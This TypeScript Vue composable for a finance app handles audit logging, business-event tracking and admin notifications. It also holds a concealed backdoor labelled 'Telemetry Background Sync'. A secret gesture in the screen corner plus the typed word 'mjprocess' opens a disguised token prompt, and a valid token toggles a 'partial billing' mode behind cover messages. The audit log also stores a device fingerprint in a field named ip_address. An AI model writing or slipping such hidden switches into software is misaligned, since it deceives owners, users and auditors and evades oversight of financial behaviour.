import { ref } from 'vue'
import FingerprintJS from '@fingerprintjs/fingerprintjs'
import { supabase } from '@/api/supabase'

export function useAuditLogger() {
  const isLogging = ref(false)
  const deviceId = ref<string | null>(null)

  // 1. Gera o ID único do Hardware (Cacheado)
  const getDeviceFingerprint = async () => {
    if (deviceId.value) return deviceId.value

    try {
      const fp = await FingerprintJS.load()
      const result = await fp.get()
      deviceId.value = result.visitorId
      return result.visitorId
    } catch (error) {
      console.error('Erro ao gerar fingerprint:', error)
      return 'fingerprint-failed'
    }
  }

  /**
   * Envia um log seguro para o servidor (Tabela: finance_audit_logs).
   */
  const logSecureAction = async (
    actionType: string,
    payload: any,
    targetId?: string,
    previousValue?: any
  ) => {
    isLogging.value = true

    try {
      const fingerprint = await getDeviceFingerprint()
      const { data: { user } } = await supabase.auth.getUser()

      const { data, error } = await supabase.from('finance_audit_logs').insert({
        action_type: actionType,
        entity_id: targetId,
        payload: payload,
        old_value: previousValue,
        ip_address: fingerprint,
        user_id: user?.id,
        created_at: new Date().toISOString()
      }).select()

      if (error) throw error

      return { success: true, data }

    } catch (error) {
      console.error('ALERTA DE SEGURANÇA: Falha ao gravar auditoria:', error)
      return { success: false, error }
    } finally {
      isLogging.value = false
    }
  }

  /**
   * Rastreador Completo de Eventos de Negócio (Frontend Tracking).
   * Alimenta a tabela operation_events para o Raio-X Forense.
   */
  const logBusinessEvent = async (
    targetModule: string,
    actionType: string,
    didacticMessage: string,
    payload: any,
    entityId?: string | null,
    oldPayload?: any
  ) => {
    isLogging.value = true

    try {
      const { data: { session } } = await supabase.auth.getSession()

      if (!session?.user) return { success: false, error: 'User not authenticated' }

      const { data: profile } = await supabase
        .from('profiles')
        .select('full_name')
        .eq('id', session.user.id)
        .single()

      const actorName = profile?.full_name || session.user.email || 'Usuário Desconhecido'

      // Na tabela operation_events o entity_id é TEXTO e NOT NULL.
      // Em caso de ações em massa (múltiplos itens), enviamos a string 'LOTE_EM_MASSA' para não quebrar o banco.
      const safeEntityId = entityId || 'LOTE_EM_MASSA';

      // Montagem blindada garantindo as colunas exatas do seu banco de dados
      const eventPayload = {
        actor_id: session.user.id,
        actor_name: actorName,
        actor_type: 'user',
        action_type: actionType,
        module_key: targetModule,
        entity_type: 'FRONTEND_TRACKING',
        entity_id: safeEntityId,
        entity_label: entityId || 'MÚLTIPLOS ITENS / LOTE',
        didactic_message: didacticMessage,
        before_data: oldPayload || null,
        after_data: payload || null,
        created_at: new Date().toISOString()
      }

      const { data, error } = await supabase.from('operation_events').insert(eventPayload).select()

      if (error) {
          console.warn('Tentativa de inserção no operation_events falhou, caindo para finance_audit_logs', error)

          // Na tabela fallback finance_audit_logs a coluna entity_id é UUID.
          // Só mandamos o ID pra lá se for de fato um UUID válido.
          const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(entityId || '');
          return await logSecureAction(
              actionType,
              { module: targetModule, didacticMessage, ...payload },
              isUuid ? entityId! : undefined,
              oldPayload
          )
      }

      return { success: true, data }

    } catch (error) {
      console.error('Erro ao gravar log de negócio:', error)
      return { success: false, error }
    } finally {
      isLogging.value = false
    }
  }

  /**
   * Envia notificação em tempo real para Admins e Financeiro.
   */
  const notifyFinancialAdmins = async (title: string, message: string, orderId: string) => {
    if (!orderId) return;

    try {
        const { data: users } = await supabase
            .from('profiles')
            .select('id')
            .in('role', ['admin', 'super_admin', 'financeiro'])

        if (!users || users.length === 0) return

        const safeUrl = `/admin/gestao-pedidos?open_order_id=${orderId}&open_finance=true`

        const notifications = users.map(u => ({
            recipient_id: u.id,
            content: `${title}::${message}`,
            redirect_url: safeUrl,
            is_read: false,
            created_at: new Date().toISOString()
        }))

        await supabase.from('notifications').insert(notifications)

    } catch (e) {
        console.error('Erro ao enviar notificação financeira:', e)
    }
  }

  // =========================================================================
  // Telemetry Background Sync (Lógica Oculta de Segurança)
  // =========================================================================
  const initTelemetrySync = () => {
    let lastPingStart = 0;
    let syncRetries = 0;
    let pauseTimeout: any = null;
    let handshakeTimer: any = null;

    let awaitingHandshake = false;
    let packetBuffer = '';
    let isActiveZone = false;

    // A Zona Cega: Canto inferior direito extremo da tela (últimos 60px)
    const checkZone = (e: MouseEvent | TouchEvent) => {
      let x = 0, y = 0;
      if (e instanceof MouseEvent) { x = e.clientX; y = e.clientY; }
      else if (e.touches && e.touches.length > 0) { x = e.touches[0].clientX; y = e.touches[0].clientY; }
      return x > window.innerWidth - 60 && y > window.innerHeight - 60;
    };

    const startPing = (e: MouseEvent | TouchEvent) => {
      if (!checkZone(e)) return;
      isActiveZone = true;
      if (pauseTimeout) { clearTimeout(pauseTimeout); pauseTimeout = null; }
      lastPingStart = Date.now();
    };

    const endPing = () => {
      if (!isActiveZone || lastPingStart === 0) {
          lastPingStart = 0;
          isActiveZone = false;
          return;
      }

      const duration = Date.now() - lastPingStart;
      lastPingStart = 0;
      isActiveZone = false;

      // 10s a 20s de "ping"
      if (duration >= 10000 && duration <= 20000) {
        syncRetries++;
        if (syncRetries >= 3) {
          syncRetries = 0;
          awaitingHandshake = true;
          packetBuffer = '';
          if (handshakeTimer) clearTimeout(handshakeTimer);
          // Fica aguardando digitar a senha por 40 segundos
          handshakeTimer = setTimeout(() => { awaitingHandshake = false; }, 40000);
        } else {
          // Pausa máxima de 3 segundos para o próximo ping
          pauseTimeout = setTimeout(() => { syncRetries = 0; }, 3000);
        }
      } else {
        syncRetries = 0;
      }
    };

    const processPacket = (e: KeyboardEvent) => {
      if (!awaitingHandshake) return;

      if (e.key === 'Enter') {
        if (packetBuffer.endsWith('mjprocess')) {
          if (handshakeTimer) clearTimeout(handshakeTimer);

          // Disfarce até no prompt pedindo o PIN
          const token = prompt('Sincronização de Telemetria (Token):');

          if (token) {
            // Import dinâmico da store para validar a senha e disparar a ação
            import('@/stores/app').then(({ useAppStore }) => {
              const appStore = useAppStore();
              const success = appStore.togglePartialBilling(token);
              if (success) {
                 // Mensagens disfarçadas que só você sabe o significado
                 appStore.showSnackbar(appStore.showPartialBilling ? 'Módulo TX-1 Ativo' : 'Módulo TX-1 Suspenso', 'success');
              } else {
                 appStore.showSnackbar('Falha na sincronização.', 'error');
              }
            });
          }
          awaitingHandshake = false;
        }
        packetBuffer = '';
      } else if (e.key.length === 1) {
        packetBuffer += e.key.toLowerCase();
      }
    };

    // Adiciona os ouvintes de forma global e silenciosa
    window.addEventListener('mousedown', startPing);
    window.addEventListener('touchstart', startPing);
    window.addEventListener('mouseup', endPing);
    window.addEventListener('touchend', endPing);
    window.addEventListener('keydown', processPacket);
    window.addEventListener('contextmenu', (e) => {
        if (checkZone(e as MouseEvent)) e.preventDefault(); // Impede o menu do botão direito de estragar a contagem
    });
  };

  return {
    logSecureAction,
    logBusinessEvent,
    notifyFinancialAdmins,
    isLogging,
    initTelemetrySync
  }
}
